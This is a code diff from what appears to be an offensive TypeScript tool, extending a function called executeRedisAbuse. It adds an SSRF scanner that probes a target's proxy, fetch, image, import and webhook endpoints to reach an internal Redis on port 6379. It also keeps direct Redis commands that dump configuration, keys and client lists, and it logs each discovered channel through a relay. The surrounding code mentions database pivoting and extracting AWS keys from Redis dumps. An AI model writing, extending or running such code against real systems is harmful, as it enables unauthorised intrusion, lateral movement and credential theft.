@@ -133,18 +133,46 @@ export async function executeRedisAbuse(target: string, password: string): Promi
       client.write(cmd + '\r\n');
     };
 
-    client.connect(6379, 'localhost', () => {
-      if (password) {
-        sendCommand(`AUTH ${password}`);
-      } else {
-        authenticated = true;
-        // Enviar comandos iniciais
-        sendCommand('INFO server');
-        sendCommand('CONFIG GET *');
-        sendCommand('DBSIZE');
-        sendCommand('KEYS *');
-        sendCommand('CLIENT LIST');
-        sendCommand('SLOWLOG GET 100');
+    const tryConnectDirect = () => {
+      client.connect(6379, 'localhost', () => {
+        if (password) {
+          sendCommand(`AUTH ${password}`);
+        } else {
+          authenticated = true;
+          // Enviar comandos iniciais
+          sendCommand('INFO server');
+          sendCommand('CONFIG GET *');
+          sendCommand('DBSIZE');
+          sendCommand('KEYS *');
+          sendCommand('CLIENT LIST');
+          sendCommand('SLOWLOG GET 100');
+        }
+      });
+    };
+
+    // SSRF auto-scan: tenta achar um endpoint proxy no target antes de abrir TCP
+    const trySSRF = async () => {
+      try {
+        const ssrf = await findSSRFChannel(target);
+        if (!ssrf) return false;
+        // Apenas registra descoberta (implantar túnel gopher completo exigiria mais integração)
+        relayIngest([{
+          key: "SSRF_CHANNEL",
+          value: `${target}${ssrf}`,
+          type: "SSRF_TUNNEL",
+          source: "redis_abuse",
+          target,
+          capturedAt: new Date().toISOString()
+        }]);
+        return false; // fallback para TCP por enquanto
+      } catch {
+        return false;
+      }
+    };
+
+    trySSRF().then((used) => {
+      if (!used) {
+        tryConnectDirect();
       }
     });
 
@@ -296,6 +324,27 @@ function attemptDbPivot(target: string, password: string) {
     target,
     capturedAt: new Date().toISOString()
   }]);
+}
+
+async function findSSRFChannel(target: string): Promise<string | null> {
+  const candidates = [
+    "/api/proxy",
+    "/api/fetch",
+    "/api/image",
+    "/api/import",
+    "/api/webhook",
+  ];
+  for (const path of candidates) {
+    try {
+      const probe = await fetch(`${target}${path}?url=http://127.0.0.1:6379`);
+      if (probe.status < 500) {
+        return path;
+      }
+    } catch {
+      continue;
+    }
+  }
+  return null;
 }
 
 export function extractAwsFromRedis(redisResult: RedisDump): { accessKey: string; secretKey: string } | null {
